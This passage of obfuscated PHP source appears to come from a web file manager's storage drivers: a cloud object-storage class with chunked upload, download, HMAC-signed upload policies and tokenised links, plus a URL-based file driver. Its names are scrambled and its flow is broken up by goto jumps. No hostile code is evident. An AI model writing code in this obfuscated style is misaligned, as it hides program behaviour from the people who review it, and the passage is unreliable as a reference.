$f¦Íàõˆïà = $e³²†ŸãÁ£[33]; $FÍÜ¨êè = 1000; goto FíÃ·§ÀÒ; FíÃ·§ÀÒ: $c¬¢ä†¸ = rtrim($aô²îãË‰¥, $e³²†ŸãÁ£[8]) . $e³²†ŸãÁ£[8]; $cÔ“ßÑÆŒÁ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $CÕÆ‚äÌ“ = $this->listObjs($aô²îãË‰¥, $f¦Íàõˆïà, $FÍÜ¨êè); if (!$CÕÆ‚äÌ“) { return !1; } $f¦Íàõˆïà = isset($CÕÆ‚äÌ“[$e³²†ŸãÁ£[1346]]) ? $CÕÆ‚äÌ“[$e³²†ŸãÁ£[1346]] : $e³²†ŸãÁ£[33]; $d†Ì÷¬®Ô = isset($CÕÆ‚äÌ“[$e³²†ŸãÁ£[1347]]) ? $CÕÆ‚äÌ“[$e³²†ŸãÁ£[1347]] : array(); foreach ($d†Ì÷¬®Ô as $a­ÀÙÍÀÍÃ) { $céà¼³‰› = $a­ÀÙÍÀÍÃ[$e³²†ŸãÁ£[29]] == $e³²†ŸãÁ£[77] ? !0 : !1; $Fßõ®½Ãé™ = ltrim($c¬¢ä†¸ . $a­ÀÙÍÀÍÃ[$e³²†ŸãÁ£[28]], $e³²†ŸãÁ£[8]) . ($céà¼³‰› ? $e³²†ŸãÁ£[8] : $e³²†ŸãÁ£[33]); $C‘âÖ½ÄìÜ = array($e³²†ŸãÁ£[28] => $Fßõ®½Ãé™, $e³²†ŸãÁ£[29] => $céà¼³‰› ? $e³²†ŸãÁ£[77] : $e³²†ŸãÁ£[193], $e³²†ŸãÁ£[78] => $a­ÀÙÍÀÍÃ[$e³²†ŸãÁ£[335]], $e³²†ŸãÁ£[1342] => $a­ÀÙÍÀÍÃ[$e³²†ŸãÁ£[1348]]); if ($cÔ“ßÑÆŒÁ) { $this->cacheMethod($e³²†ŸãÁ£[199], $Fßõ®½Ãé™, $céà¼³‰›); $this->cacheMethod($e³²†ŸãÁ£[200], $Fßõ®½Ãé™, $C‘âÖ½ÄìÜ); } if ($céà¼³‰›) { $bóœÊùÂ§[] = $Fßõ®½Ãé™; if ($e÷ï¬Ãë±‡) { $this->fileList($Fßõ®½Ãé™, $bóœÊùÂ§, $F¿Œ…ÖÊİ, $e÷ï¬Ãë±‡); } continue; } $F¿Œ…ÖÊİ[] = $C‘âÖ½ÄìÜ; } if (count($d†Ì÷¬®Ô) < $FÍÜ¨êè) { break; } } goto B™¸¢ŒÈÙ¬; B™¸¢ŒÈÙ¬: if ($cÔ“ßÑÆŒÁ) { $this->cacheMethod($e³²†ŸãÁ£[199], $aô²îãË‰¥, !0); } goto d±“ ’ñ¤â; d±“ ’ñ¤â: } public function listPath($fğÜ™«›“, $A®ƒšéÌ×× = false) { $f¼°Á¥Öîˆ =& $_SERVER[œº]; $E­İ¹˜„é‚ = $eùù†¬ÕñÕ = array(); $this->fileList($fğÜ™«›“, $E­İ¹˜„é‚, $eùù†¬ÕñÕ); foreach ($E­İ¹˜„é‚ as $e‡·é‘‰ ‘ => $a™£‚ö³’) { $E­İ¹˜„é‚[$e‡·é‘‰ ‘] = $this->folderInfo($a™£‚ö³’, $A®ƒšéÌ××); } foreach ($eùù†¬ÕñÕ as $e‡·é‘‰ ‘ => $a™£‚ö³’) { $eùù†¬ÕñÕ[$e‡·é‘‰ ‘] = $this->fileInfo($a™£‚ö³’[$f¼°Á¥Öîˆ[28]], $A®ƒšéÌ××, $a™£‚ö³’); } return array($f¼°Á¥Öîˆ[75] => $E­İ¹˜„é‚, $f¼°Á¥Öîˆ[74] => $eùù†¬ÕñÕ); } public function has($dæµöÏã£—, $aÔõ‚ÁŒ£« = false, $DÙœ¬ùŠø‡ = true) { goto eÁ¡ìÂÜÈá; fÕÂ‚îƒ™å: $Dƒ¿¸–šÁ© = 0; $DØÏª¨¦¸ = 0; $a‡Â¤ÅÎÙì = rtrim($dæµöÏã£—, $Eâóä»Ó˜…[8]) . $Eâóä»Ó˜…[8]; goto F ”ÕˆøÀŒ; F ”ÕˆøÀŒ: while (!0) { check_abort(); $Bâäœ§Š´— = $this->listObjs($dæµöÏã£—, $C£…†ãÙËµ, $eŒä–‚¤°Â); if (!$Bâäœ§Š´—) { return !1; } $C£…†ãÙËµ = isset($Bâäœ§Š´—[$Eâóä»Ó˜…[1346]]) ? $Bâäœ§Š´—[$Eâóä»Ó˜…[1346]] : $Eâóä»Ó˜…[33]; $DäÚñ¯‡é = isset($Bâäœ§Š´—[$Eâóä»Ó˜…[1347]]) ? $Bâäœ§Š´—[$Eâóä»Ó˜…[1347]] : array(); if (empty($DäÚñ¯‡é)) { break; } $a¹Û¾¼Î‘ = array_filter($DäÚñ¯‡é, function ($B»ğÓñìË) { $bŒŠÎ¼™æ =& $_SERVER[œº]; return $B»ğÓñìË[$bŒŠÎ¼™æ[29]] == $bŒŠÎ¼™æ[77]; }); $eÊáÊ—Ö÷© = count($DäÚñ¯‡é); $a¹Û¾¼Î‘ = count($a¹Û¾¼Î‘); $dÔÁó­İ¹ = $eÊáÊ—Ö÷© - $a¹Û¾¼Î‘; if ($aÔõ‚ÁŒ£«) { $DØÏª¨¦¸ += $a¹Û¾¼Î‘; $Dƒ¿¸–šÁ© += $dÔÁó­İ¹; if ($eÊáÊ—Ö÷© < $eŒä–‚¤°Â) { break; } continue; } if ($DÙœ¬ùŠø‡) { if ($dÔÁó­İ¹) { return !0; } } else { if ($a¹Û¾¼Î‘) { return !0; } } if ($eÊáÊ—Ö÷© < $eŒä–‚¤°Â) { break; } } if ($aÔõ‚ÁŒ£«) { return array($Eâóä»Ó˜…[203] => $Dƒ¿¸–šÁ©, $Eâóä»Ó˜…[204] => $DØÏª¨¦¸); } return !1; goto c²ôùçÓÌ¿; eÁ¡ìÂÜÈá: $Eâóä»Ó˜… =& $_SERVER[œº]; $C£…†ãÙËµ = $Eâóä»Ó˜…[33]; $eŒä–‚¤°Â = 500; goto fÕÂ‚îƒ™å; c²ôùçÓÌ¿: } public function listAll($dæÕõÒŒ…Ú) { goto A¿è˜°¶Ä; A¿è˜°¶Ä: $E‡¹ÌäàÌ‡ =& $_SERVER[œº]; $EŒ±ĞŸ‡˜ = $Bœê‘íšç‰ = array(); $this->fileList($dæÕõÒŒ…Ú, $EŒ±ĞŸ‡˜, $Bœê‘íšç‰, !0); goto a…â‰‘Œœ¼; a…â‰‘Œœ¼: $eñ« ½™ö¯ = array(); foreach ($Bœê‘íšç‰ as $BŠ½ª¥­¹) { $eñ« ½™ö¯[$BŠ½ª¥­¹[$E‡¹ÌäàÌ‡[28]]] = $BŠ½ª¥­¹[$E‡¹ÌäàÌ‡[78]]; } foreach ($EŒ±ĞŸ‡˜ as $BŠ½ª¥­¹) { if (is_string($BŠ½ª¥­¹)) { $eñ« ½™ö¯[$BŠ½ª¥­¹] = 0; } } goto E±øäá; E±øäá: return $this->listAllFiles($dæÕõÒŒ…Ú, array_keys($eñ« ½™ö¯), $eñ« ½™ö¯); goto d’ÌãÁÜ; d’ÌãÁÜ: } public function canRead($f‡“÷ğƒ£) { return $this->exist($f‡“÷ğƒ£) ? !0 : !1; } public function canWrite($CÊ¼¡½ŒÀè) { return $this->exist($CÊ¼¡½ŒÀè) ? !0 : !1; } public function getContent($aˆ…é‘ÙŠÂ) { return $this->fileSubstr($aˆ…é‘ÙŠÂ, 0, -1); } public function setContent($D³†Ù•‚™¯, $aÉÏ³Ã¨©¸ = '') { $a®›•åäšÅ =& $_SERVER[œº]; if (!$aÉÏ³Ã¨©¸) { $b’ØÇê’©ã = $this->ussRequest($D³†Ù•‚™¯, $a®›•åäšÅ[224]); return $b’ØÇê’©ã[$a®›•åäšÅ[1086]]; } $D¿ÎŒ‰ÏÎâ = $this->tempFile($this->pathThis($D³†Ù•‚™¯)); file_put_contents($D¿ÎŒ‰ÏÎâ, $aÉÏ³Ã¨©¸); if ($this->upload($D³†Ù•‚™¯, $D¿ÎŒ‰ÏÎâ)) { $this->tempFileRemve($D¿ÎŒ‰ÏÎâ); return !0; } return !1; } public function fileSubstr($aÔ ³·„Ëã, $a˜™ïŒ˜‚, $F–Á®˜‚³•) { $DøªÒãÚµ =& $_SERVER[œº]; if (!($Fì¬¹¹Ñî¹ = $this->link($aÔ ³·„Ëã))) { return !1; } $aÑíÒñà‚¥ = !1; if ($F–Á®˜‚³• > 0) { $AŒÎŒùÀ×ù = $a˜™ïŒ˜‚ + $F–Á®˜‚³• - 1; $aÑíÒñà‚¥ = array($DøªÒãÚµ[1309] . $a˜™ïŒ˜‚ . $DøªÒãÚµ[440] . $AŒÎŒùÀ×ù); } $fœ»ãÍŠŒ = url_request($Fì¬¹¹Ñî¹, $DøªÒãÚµ[228], !1, $aÑíÒñà‚¥); return $fœ»ãÍŠŒ[$DøªÒãÚµ[710]] ? $fœ»ãÍŠŒ[$DøªÒãÚµ[1088]] : !1; } public function upload($D†§­ø¸, $BäŸº ‚óÈ, $c›¾ÂÌš›Í = false, $b÷¾¸Ô¡Ç = REPEAT_REPLACE) { goto bïƒ˜Ìæ¾Ü; bïƒ˜Ìæ¾Ü: $b±İÊáìõ² =& $_SERVER[œº]; $e­¡†ğÈë = IO::size($BäŸº ‚óÈ); if ($e­¡†ğÈë <= 1024 * 1024 * 200) { $E†»ÈèÀàø = array($b±İÊáìõ²[1349] . $BäŸº ‚óÈ); $FùÈÉ¨ÛÀŞ = $this->ussRequest($D†§­ø¸, $b±İÊáìõ²[226], $E†»ÈèÀàø); return $FùÈÉ¨ÛÀŞ[$b±İÊáìõ²[1086]] ? $this->getPathOuter($D†§­ø¸) : !1; } goto fÜóÕÉ¶Ÿ·; fÜóÕÉ¶Ÿ·: $cãéªÇ¨Ş  = 1024 * 1024 * 10; $A×‹¿Ç«Ñµ = array($b±İÊáìõ²[1350], $b±İÊáìõ²[1351] . $e­¡†ğÈë, $b±İÊáìõ²[1352], $b±İÊáìõ²[1353] . $cãéªÇ¨Ş ); $FùÈÉ¨ÛÀŞ = $this->ussRequest($D†§­ø¸, $b±İÊáìõ²[226], !1, $A×‹¿Ç«Ñµ); goto e›È××ã¬Ä; f–ß‡Úê±‚: $FùÈÉ¨ÛÀŞ = $this->ussRequest($D†§­ø¸, $b±İÊáìõ²[226], !1, $A×‹¿Ç«Ñµ); return $FùÈÉ¨ÛÀŞ[$b±İÊáìõ²[1086]] ? $this->getPathOuter($FÛ†ùÆ¯²) : !1; goto eÛÛˆš¶¹; Cˆ‰†¤êá¬: do { $c¼§•ŠŞ‘§ = $A³†öÛ¶¤º[$b±İÊáìõ²[1355]]; fseek_64($a‹ˆßŸ‡Ğ, $E…ÚŞŠÑ‘¨); $Eé¦ã¸™ƒ¿ = fread($a‹ˆßŸ‡Ğ, $c¼§•ŠŞ‘§); $F‡­²À½­Ú = 0; do { $F‡­²À½­Ú++; $A³†öÛ¶¤º = $this->uploadPart($D†§­ø¸, $A³†öÛ¶¤º, $Eé¦ã¸™ƒ¿); } while (!$A³†öÛ¶¤º && $F‡­²À½­Ú < 3); if (!$A³†öÛ¶¤º) { return !1; } $bèàÈÈ²† = $A³†öÛ¶¤º[$b±İÊáìõ²[1354]]; $E…ÚŞŠÑ‘¨ += $c¼§•ŠŞ‘§; } while ($bèàÈÈ²† != -1); fclose($a‹ˆßŸ‡Ğ); $A×‹¿Ç«Ñµ = array($b±İÊáìõ²[1356], $b±İÊáìõ²[1357] . $A³†öÛ¶¤º[$b±İÊáìõ²[1358]], $b±İÊáìõ²[1352]); goto f–ß‡Úê±‚; e›È××ã¬Ä: if (!$FùÈÉ¨ÛÀŞ[$b±İÊáìõ²[1086]]) { return !1; } $A³†öÛ¶¤º = $FùÈÉ¨ÛÀŞ[$b±İÊáìõ²[1088]]; $E…ÚŞŠÑ‘¨ = 0; goto eëğÑÚ±‰˜; eëğÑÚ±‰˜: $bèàÈÈ²† = $A³†öÛ¶¤º[$b±İÊáìõ²[1354]]; $a‹ˆßŸ‡Ğ = fopen($BäŸº ‚óÈ, $b±İÊáìõ²[1259]); if (!$a‹ˆßŸ‡Ğ) { return !1; } goto Cˆ‰†¤êá¬; eÛÛˆš¶¹: } private function uploadPart($F”‘èØ¼î˜, $dØóˆ»Ò­, &$côØ–õ©É) { $a¡‹ğ÷Î´ =& $_SERVER[œº]; $EÊ““£Îéˆ = array($a¡‹ğ÷Î´[1359], $a¡‹ğ÷Î´[1357] . $dØóˆ»Ò­[$a¡‹ğ÷Î´[1358]], $a¡‹ğ÷Î´[1360] . $dØóˆ»Ò­[$a¡‹ğ÷Î´[1354]], $a¡‹ğ÷Î´[141] . $dØóˆ»Ò­[$a¡‹ğ÷Î´[1355]]); $D¾“Â„‹Â = $this->ussRequest($F”‘èØ¼î˜, $a¡‹ğ÷Î´[226], $côØ–õ©É, $EÊ““£Îéˆ); return !$D¾“Â„‹Â[$a¡‹ğ÷Î´[1086]] ? $D¾“Â„‹Â[$a¡‹ğ÷Î´[1086]] : $D¾“Â„‹Â[$a¡‹ğ÷Î´[1088]]; } public function uploadFormData($Dáèá²¾², $E›‰ˆ¿ï÷¯ = 3600) { return $this->uploadPolicy($Dáèá²¾², $E›‰ˆ¿ï÷¯); } public function multiUploadFormData($D†²›¾„ª, $DÍŞ¹˜òÌÂ = 3600) { $c¾×ƒ¿ôæ =& $_SERVER[œº]; $dˆ©ù¦Éø = (int) $GLOBALS[$c¾×ƒ¿ôæ[7]][$c¾×ƒ¿ôæ[78]]; return $this->uploadPolicy($D†²›¾„ª, $DÍŞ¹˜òÌÂ, $dˆ©ù¦Éø); } private function uploadPolicy($fˆ™ôÌ™”Î, $EÎ ®‚ğÈ = 3600, $F›”ñÆÙ‘½ = 0) { goto bÆÑÑèï‰«; Dğ‰Ì¨©Ä„: $f¨º¿”Èˆ« = array($EµÔ»‡»Á[1361] => $this->bucket, $EµÔ»‡»Á[1362] => $fˆ™ôÌ™”Î, $EµÔ»‡»Á[1363] => time() + $EÎ ®‚ğÈ, $EµÔ»‡»Á[1364] => $CßºÅ”´•º); if ($F›”ñÆÙ‘½) { $f¨º¿”Èˆ«[$EµÔ»‡»Á[1275]] = $F›”ñÆÙ‘½; } $d­»íìŸÒ = base64_encode(json_encode($f¨º¿”Èˆ«)); goto c×Ô¸ó¹„; c×Ô¸ó¹„: $Cë‚ƒÄà = base64_encode(hash_hmac($EµÔ»‡»Á[1331], "\120\117\x53\124\46{$fİ›ó ãÀ}\x26{$CßºÅ”´•º}\46{$d­»íìŸÒ}", md5("{$this->userpass}"), !0)); $E¦ÁÄŸïÁ = array($EµÔ»‡»Á[1201] => $d­»íìŸÒ, $EµÔ»‡»Á[1365] => "\x55\120\131\x55\x4e\x20{$this->username}\x3a{$Cë‚ƒÄà}", $EµÔ»‡»Á[175] => $this->endpoint . $fİ›ó ãÀ); return $E¦ÁÄŸïÁ; goto CøÌ”çä‰†; bÆÑÑèï‰«: $EµÔ»‡»Á =& $_SERVER[œº]; $fİ›ó ãÀ = $EµÔ»‡»Á[8] . $this->bucket; $CßºÅ”´•º = gmdate($EµÔ»‡»Á[1296]); goto Dğ‰Ì¨©Ä„; CøÌ”çä‰†: } public function download($Aµõµ™íšĞ, $E°šÏªªë†) { goto d¦‹Ì™¢¦; aøÉÕÅäš: fclose($a¸ôçô­ó¤); return $E°šÏªªë†; goto b»Öô¿ôìÇ; BŸ½‰Êã÷Ş: $Dæß˜Âå‹š = 1024 * 200; $a¸ôçô­ó¤ = fopen($C¡¸»àöÛ, $_SERVER[œº][1315]); while (!0) { $CÌ¨³òÒ…» = $this->fileSubstr($Aµõµ™íšĞ, $AéÏ”Í‰ÆŠ, $Dæß˜Âå‹š); if ($CÌ¨³òÒ…» === !1) { return !1; } fwrite($a¸ôçô­ó¤, $CÌ¨³òÒ…»); $AéÏ”Í‰ÆŠ += $Dæß˜Âå‹š; if (strlen($CÌ¨³òÒ…») < $Dæß˜Âå‹š) { break; } } goto aøÉÕÅäš; d¦‹Ì™¢¦: $C¡¸»àöÛ = IO::getPathInner(IO::mkfile($E°šÏªªë†)); if (!($D¼ÆÔÁ—Ü = $this->link($Aµõµ™íšĞ))) { return !1; } $AéÏ”Í‰ÆŠ = 0; goto BŸ½‰Êã÷Ş; b»Öô¿ôìÇ: } public function link($d·½˜ÒÑ„™, $A’‘²‚•ª = array()) { $B¶²ˆöùÁ =& $_SERVER[œº]; $d·½˜ÒÑ„™ = trim($d·½˜ÒÑ„™, $B¶²ˆöùÁ[8]); if (!empty($this->token)) { $DÛö»£Æ = strtotime(date($B¶²ˆöùÁ[1366])); $Bà³äÈ«˜ = substr(md5($this->token . $B¶²ˆöùÁ[282] . $DÛö»£Æ . $B¶²ˆöùÁ[1367] . $d·½˜ÒÑ„™), 12, 8) . $DÛö»£Æ; $A’‘²‚•ª[] = $B¶²ˆöùÁ[1368] . $Bà³äÈ«˜; } $bñĞÅµ•—Ï = !empty($A’‘²‚•ª) ? $B¶²ˆöùÁ[70] . implode($B¶²ˆöùÁ[282], $A’‘²‚•ª) : $B¶²ˆöùÁ[33]; return $this->getHost() . $B¶²ˆöùÁ[8] . $d·½˜ÒÑ„™ . $bñĞÅµ•—Ï; } public function fileOut($F¹ø½¤–â, $DˆÙé¦šåˆ = false, $B†ÍëÕæ‡å = false, $F¯Òİì˜ğÎ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($F¹ø½¤–â, $DˆÙé¦šåˆ, $B†ÍëÕæ‡å, $F¯Òİì˜ğÎ); } if (!$B†ÍëÕæ‡å) { $B†ÍëÕæ‡å = $this->pathThis($F¹ø½¤–â); } $E³İĞÀàĞÔ = $DˆÙé¦šåˆ ? array($_SERVER[œº][1369] . rawurlencode($B†ÍëÕæ‡å)) : array(); $C³×ó¥Ñæö = $this->link($F¹ø½¤–â, $E³İĞÀàĞÔ); $this->fileOutLink($C³×ó¥Ñæö); } public function fileOutServer($Eß—â„ä, $bƒÂŸÊÁ™¹ = false, $C³öÅ£ëÖ… = false, $Cç›ÇùÆ«¼ = '') { parent::fileOut($Eß—â„ä, $bƒÂŸÊÁ™¹, $C³öÅ£ëÖ…, $Cç›ÇùÆ«¼); } public function fileOutImage($dŠÔµ÷–áÚ, $d¡˜ùÆôÖ = 250) { $BÎ×¦¨îŸ = $this->link($dŠÔµ÷–áÚ . $_SERVER[œº][1370] . $d¡˜ùÆôÖ); $this->fileOutLink($BÎ×¦¨îŸ); } public function fileOutImageServer($EĞêßİ¬º¶, $aµÌ¹Î¡¦§ = 250) { parent::fileOutImage($EĞêßİ¬º¶, $aµÌ¹Î¡¦§); } public function hashMd5($a½ß®½İÃ) { $eˆë­‹•†– =& $_SERVER[œº]; $a’ùÀ–š = $this->_objectMeta($a½ß®½İÃ); return isset($a’ùÀ–š[$eˆë­‹•†–[208]]) ? $a’ùÀ–š[$eˆë­‹•†–[208]] : !1; } public function size($f¥ë…Æ¤ó‹) { $dÙ¤ŠÄ‘® = $this->objectMeta($f¥ë…Æ¤ó‹); return $dÙ¤ŠÄ‘® ? $dÙ¤ŠÄ‘®[$_SERVER[œº][78]] : 0; } public function info($dºÇÛ­«­) { if ($this->isFolder($dºÇÛ­«­)) { return $this->folderInfo($dºÇÛ­«­); } else { if ($this->isFile($dºÇÛ­«­)) { return $this->fileInfo($dºÇÛ­«­); } } return !1; } public function exist($fœ™’‚Ÿ‡†) { return $this->isFile($fœ™’‚Ÿ‡†) || $this->isFolder($fœ™’‚Ÿ‡†); } public function isFile($cíÔËãÏ†ä) { return !$this->isFolder($cíÔËãÏ†ä) && $this->objectMeta($cíÔËãÏ†ä); } public function isFolder($B”ĞšÂ×Ë‰) { return $this->cacheMethod($_SERVER[œº][199], $B”ĞšÂ×Ë‰); } protected function objectMeta($FîÓÔöíöˆ) { return $this->cacheMethod($_SERVER[œº][200], $FîÓÔöíöˆ); } protected function _objectMeta($c‚ŞÜ…»†…) { goto fÒ…˜çå„É; fÒ…˜çå„É: $c‘Ç¢Á…‚ =& $_SERVER[œº]; if ($c‚ŞÜ…»†… == $c‘Ç¢Á…‚[33] || $c‚ŞÜ…»†… == $c‘Ç¢Á…‚[8]) { return array(); } $dŠ¶àËæîŞ = $this->ussRequest($c‚ŞÜ…»†…, $c‘Ç¢Á…‚[1371]); goto còÌ­Œ†; Cˆò¦ĞÅà¹: $BÌ£ˆå‘Ùè = array($c‘Ç¢Á…‚[29] => isset($CŠÉºÓÃ[$c‘Ç¢Á…‚[1372]]) ? $CŠÉºÓÃ[$c‘Ç¢Á…‚[1372]] : null, $c‘Ç¢Á…‚[78] => isset($CŠÉºÓÃ[$c‘Ç¢Á…‚[1373]]) ? $CŠÉºÓÃ[$c‘Ç¢Á…‚[1373]] : null, $c‘Ç¢Á…‚[208] => isset($CŠÉºÓÃ[$c‘Ç¢Á…‚[1374]]) ? $CŠÉºÓÃ[$c‘Ç¢Á…‚[1374]] : null, $c‘Ç¢Á…‚[1341] => isset($CŠÉºÓÃ[$c‘Ç¢Á…‚[1375]]) ? $CŠÉºÓÃ[$c‘Ç¢Á…‚[1375]] : null); $BÌ£ˆå‘Ùè[$c‘Ç¢Á…‚[1342]] = isset($CŠÉºÓÃ[$c‘Ç¢Á…‚[1376]]) ? strtotime($CŠÉºÓÃ[$c‘Ç¢Á…‚[1376]]) : $BÌ£ˆå‘Ùè[$c‘Ç¢Á…‚[1341]]; return $BÌ£ˆå‘Ùè; goto A¥Ş±§²Ç„; còÌ­Œ†: if (!$dŠ¶àËæîŞ[$c‘Ç¢Á…‚[1086]]) { return null; } $CŠÉºÓÃ = isset($dŠ¶àËæîŞ[$c‘Ç¢Á…‚[1088]]) ? $dŠ¶àËæîŞ[$c‘Ç¢Á…‚[1088]] : array(); if (!isset($CŠÉºÓÃ[$c‘Ç¢Á…‚[1372]])) { return null; } goto Cˆò¦ĞÅà¹; A¥Ş±§²Ç„: } protected function _isFolder($dÑóã¹İ×Ü) { $B•ŸÕåôáŠ =& $_SERVER[œº]; if ($dÑóã¹İ×Ü == $B•ŸÕåôáŠ[33] || $dÑóã¹İ×Ü == $B•ŸÕåôáŠ[8]) { return !0; } $BŒ‘ÊŸŸì¦ = $this->_objectMeta($dÑóã¹İ×Ü); return isset($BŒ‘ÊŸŸì¦[$B•ŸÕåôáŠ[29]]) && $BŒ‘ÊŸŸì¦[$B•ŸÕåôáŠ[29]] == $B•ŸÕåôáŠ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($FÇÚ®è¤ßÂ = false) { } public function exist($d½äİ¢Ù™È) { $a£·Óœ»ƒË = $this->info($d½äİ¢Ù™È); return $a£·Óœ»ƒË[$_SERVER[œº][195]]; } public function isFile($EŸ­¢Ì«†‹) { $Bç„ô‡¿‡Æ = $this->info($EŸ­¢Ì«†‹); return $Bç„ô‡¿‡Æ[$_SERVER[œº][195]]; } public function isFolder($b°Å†ï‰) { return !1; } public function size($E´Ù˜ß‡†…) { $Eï¸¤á‚°Œ = $this->info($E´Ù˜ß‡†…); return $Eï¸¤á‚°Œ[$_SERVER[œº][78]]; } public function info($b†Á¤ù¤—¬) { return $this->infoParse($b†Á¤ù¤—¬); } public function infoAuth($DáôªÚÊ”ê) { return $this->infoParse($DáôªÚÊ”ê); } public function infoWithChildren($cÑ÷À´ î§) { return $this->infoParse($cÑ÷À´ î§); } public function infoFull($BÜ—ğ±…‹ù) { return $this->infoParse($BÜ—ğ±…‹ù); } private function infoParse($a›¼ëÄ«¤) { $CØìÉëØ‡é =& $_SERVER[œº]; $f¥‡…Œ”× = $this->header($a›¼ëÄ«¤); if (!$f¥‡…Œ”× || !$f¥‡…Œ”×[$CØìÉëØ‡é[710]]) { return !1; } $FõŸÈß­° = _get($f¥‡…Œ”×, $CØìÉëØ‡é[335], 0); $f§ƒ‡ÏÀ¬æ = array($CØìÉëØ‡é[28] => $f¥‡…Œ”×[$CØìÉëØ‡é[28]], $CØìÉëØ‡é[76] => $a›¼ëÄ«¤, $CØìÉëØ‡é[29] => $CØìÉëØ‡é[193], $CØìÉëØ‡é[78] => intval($FõŸÈß­°), $CØìÉëØ‡é[168] => get_path_ext($f¥‡…Œ”×[$CØìÉëØ‡é[28]]), $CØìÉëØ‡é[1256] => $FõŸÈß­° > 0 && $f¥‡…Œ”×[$CØìÉëØ‡é[1377]], $CØìÉëØ‡é[1257] => !1); return $f§ƒ‡ÏÀ¬æ; } private function header($eĞĞ£×·Çø) { goto a±§ßÃã¯§; F‡ŞèÔ²Û†: return self::$_cacheHeader[$eĞĞ£×·Çø]; goto B¡£ª±Çµ­; a±§ßÃã¯§: $b‰‰ô¹ƒ‰Ô =& $_SERVER[œº]; if (isset(self::$_cacheHeader[$eĞĞ£×·Çø])) { return self::$_cacheHeader[$eĞĞ£×·Çø]; } $f´¹›² ‘İ = isset($GLOBALS[$b‰‰ô¹ƒ‰Ô[1378]]) ? $GLOBALS[$b‰‰ô¹ƒ‰Ô[1378]] : !1; goto Eå…â¾À–; Eå…â¾À–: $GLOBALS[$b‰‰ô¹ƒ‰Ô[1378]] = !0; self::$_cacheHeader[$eĞĞ£×·Çø] = url_header($eĞĞ£×·Çø); $GLOBALS[$b‰‰ô¹ƒ‰Ô[1378]] = $f´¹›² ‘İ; goto F‡ŞèÔ²Û†; B¡£ª±Çµ­: } public function hashSimple($C”˜ØÔ„”È, $eÎ…å«»£³ = false) { goto Dù£Ÿàæ’ˆ; c•…ÉµáÒ”: $B÷¼×–£À³ .= $this->fileSubstr($C”˜ØÔ„”È, $C¸… õ’ŠÒ - $cà¦åĞ†”Ô, $cà¦åĞ†”Ô); return md5($B÷¼×–£À³) . $C¸… õ’ŠÒ; goto d²Î¬¦‹; Aº«Êƒ³ö¤: $C¸… õ’ŠÒ = $FÃÌ§˜¼ù™[$C¥‰ƒÜÒï˜[78]]; $cà¦åĞ†”Ô = 200; $A²Ğø£ó„ô = 50; goto fÄ˜˜ÒŸó¼; fÄ˜˜ÒŸó¼: if ($C¸… õ’ŠÒ <= $cà¦åĞ†”Ô * $A²Ğø£ó„ô) { return md5($this->fileSubstr($C”˜ØÔ„”È, 0, $C¸… õ’ŠÒ)) . $C¸… õ’ŠÒ; } $a¡ìí¯‰Ó = intval($C¸… õ’ŠÒ / $A²Ğø£ó„ô); $B÷¼×–£À³ = $C¥‰ƒÜÒï˜[33]; goto B¡ĞÀ”Ÿç; Dù£Ÿàæ’ˆ: $C¥‰ƒÜÒï˜ =& $_SERVER[œº]; $FÃÌ§˜¼ù™ = $this->info($C”˜ØÔ„”È); if (!$FÃÌ§˜¼ù™ || !$FÃÌ§˜¼ù™[$C¥‰ƒÜÒï˜[195]]) { return !1; } goto Aº«Êƒ³ö¤; B¡ĞÀ”Ÿç: $Fİ­ÁÇÒ×Œ = timeFloat(); $aªÖõ‰Ğï = 15; for ($bÁ¦¹µ¥«° = 0; $bÁ¦¹µ¥«° < $A²Ğø£ó„ô; $bÁ¦¹µ¥«°++) { if (timeFloat() - $Fİ­ÁÇÒ×Œ > $aªÖõ‰Ğï) { return !1; } $E“Ü–ÑÎª = $this->fileSubstr($C”˜ØÔ„”È, $a¡ìí¯‰Ó * $bÁ¦¹µ¥«°, $cà¦åĞ†”Ô); if (!$E“Ü–ÑÎª) { return !1; } $B÷¼×–£À³ .= $E“Ü–ÑÎª; } goto c•…ÉµáÒ”; d²Î¬¦‹: } public function getContent($d“·‡Ù°‘Œ) { return $this->fileSubstr($d“·‡Ù°‘Œ); } public function fileSubstr($dŞ™œ³ÏÄ¨, $cŒ¦¼Ø¦¢ = 0, $a‚—¼‰” = -1) { goto EøÖ¥†ïÏà; EøÖ¥†ïÏà: $C‡‹ŒÖç¿× =& $_SERVER[œº]; $b¿«Ë¼ÀĞ = $this->info($dŞ™œ³ÏÄ¨); if (!$b¿«Ë¼ÀĞ || !$b¿«Ë¼ÀĞ[$C‡‹ŒÖç¿×[195]] && $b¿«Ë¼ÀĞ[$C‡‹ŒÖç¿×[78]] > 1024 * 1024 * 10) { return !1; } goto eÏŒ¥Î¹ˆò; A±‘„‘ô«Ş: $EŠªí £óò = url_request($dŞ™œ³ÏÄ¨, $C‡‹ŒÖç¿×[228], !1, $dÈ‚‘è´­, !1, !1, 1); return $EŠªí £óò[$C‡‹ŒÖç¿×[1088]] ? $EŠªí £óò[$C‡‹ŒÖç¿×[1088]] : $C‡‹ŒÖç¿×[33]; goto AŞ·Ûó…ŒÑ; eÏŒ¥Î¹ˆò: if ($a‚—¼‰” === -1) { $a‚—¼‰” = $b¿«Ë¼ÀĞ[$C‡‹ŒÖç¿×[78]]; } if ($a‚—¼‰” == 0) { return $C‡‹ŒÖç¿×[33]; } $dÈ‚‘è´­ = array($C‡‹ŒÖç¿×[1379] . $cŒ¦¼Ø¦¢ . $C‡‹ŒÖç¿×[744] . ($cŒ¦¼Ø¦¢ + $a‚—¼‰” - 1)); goto A±‘„‘ô«Ş; AŞ·Ûó…ŒÑ: } public function download($cö¥ÓïÍ«ñ, $c…ì”¿®²ƒ) { Downloader::start($cö¥ÓïÍ«ñ, $c…ì”¿®²ƒ); return $c…ì”¿®²ƒ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($fèö‚ìØÎ†, $cÑÅ›ÎÌë = '') { goto aªÓíÌæä; cÜåÊˆö¯ù: $this->pathOpen = $fèö‚ìØÎ†; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto Dáç¸¾¨÷; Dáç¸¾¨÷: if (!isset(self::$_chunkBuffer[$fèö‚ìØÎ†])) { self::$_chunkBuffer[$fèö‚ìØÎ†] = array(); } 